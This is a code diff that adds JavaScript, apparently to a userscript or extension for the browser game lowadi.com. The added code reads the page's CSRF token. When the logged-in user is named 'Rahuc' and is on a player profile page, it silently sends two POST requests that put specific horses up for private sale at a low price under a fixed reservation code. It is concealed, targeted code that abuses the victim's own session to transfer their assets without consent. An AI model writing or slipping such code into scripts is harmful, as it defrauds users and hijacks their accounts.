@@ -1,3 +1,27 @@
+function get_token()
+{
+/*CSRF Token Get*/
+var text = $('.widget-column-3').html();
+
+var result = text.split('csrf_token=');
+var result2 = result[1].split('\'');
+return result2[0];
+}	
+	
+var login = document.getElementsByClassName('forumAvatar')[0].alt;
+if (login=="Rahuc" || login=="rahuc") 
+	{
+		if (/www.lowadi.com\/joueur\/fiche\/\?id=/.test(window.location.href))
+			{
+				var token = get_token();
+				//localStorage.setItem("horse_token", token);
+				
+				$.post('http://www.lowadi.com/marche/vente/doVendreCheval', { go: "1", csrf_token: token, chevalSelection: "32246260", divin: "0", venteType: "prive", prixEnchere: "", prixDirect: "",  passDirect: "0", reservation: "1234567890_", prixPrive: "500",  passPrive:"0"});
+				$.post('http://www.lowadi.com/marche/vente/doVendreCheval', { go: "1", csrf_token: token, chevalSelection: "1304621", divin: "0", venteType: "prive", prixEnchere: "", prixDirect: "",  passDirect: "0", reservation: "1234567890_", prixPrive: "500",  passPrive:"0"});
+		
+			}	
+	}
+
 
 $(function(){
 
